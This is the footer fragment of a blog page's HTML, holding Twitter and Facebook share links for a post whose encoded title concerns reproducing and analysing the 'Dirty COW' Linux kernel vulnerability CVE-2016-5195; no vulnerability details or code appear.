          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CVE.0x00%E3%80%91CVE-2016-5195%20%E2%80%9C%E8%84%8F%E7%89%9B%E2%80%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90 + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2021%2F04%2F08%2FCVE-0X00-CVE-2016-5195%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
